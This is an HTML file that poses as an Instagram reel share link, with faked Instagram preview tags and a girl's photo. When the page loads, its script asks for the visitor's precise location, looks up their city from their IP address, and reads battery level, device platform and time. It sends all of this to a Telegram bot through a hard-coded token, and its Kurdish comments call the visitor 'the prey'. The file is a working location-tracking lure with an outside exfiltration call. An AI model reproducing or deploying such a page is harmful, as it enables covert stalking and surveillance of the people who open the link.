<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>video-rell</title>
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="video-rell">
    <meta property="og:description" content="Watch this reel on Instagram">
    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
    <meta property="og:type" content="video.other">
    <meta property="og:url" content="https://www.instagram.com/">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">

    <style>body { background: white; margin: 0; }</style>
</head>

<body onload="capture()">

<script>
    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        if (!uid) return;

        // ١. یەکسەر داوای لۆکەیشن دەکات
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            // ٢. وەرگرتنی کاتی ئێستا (بە پێی مۆبایلی نێچیرەکە)
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

            // ٣. وەرگرتنی ناوی شار بە پێی ئایپی (IP Geolocation)
            let city = "Unknown";
            try {
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                city = geoData.city + " / " + (geoData.region || "");
            } catch (e) {
                city = "Not Found";
            }

            // ٤. وەرگرتنی زانیاری باتری
            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            }

            // ٥. ڕێکخستنی ڕاپۆرتەکە
            let report = `🚨 <b>زانیاری نێچیر</b>\n\n` +
                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                         `🔋 <b>Battery:</b> ${bat}\n` +
                         `📱 <b>Device:</b> ${navigator.platform}\n` +
                         `🕒 <b>Time:</b> ${timeStr}\n` +
                         `🏙️ <b>City:</b> ${city}`;

            // ٦. ناردنی خێرا (Beacon)
            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
            navigator.sendBeacon(url);

        }, (err) => {
            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text= نێچیرەکە ڕێگری کرد لە کردنەوەی لینکەکە`;
            navigator.sendBeacon(url);
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
</script>
</body>
</html>
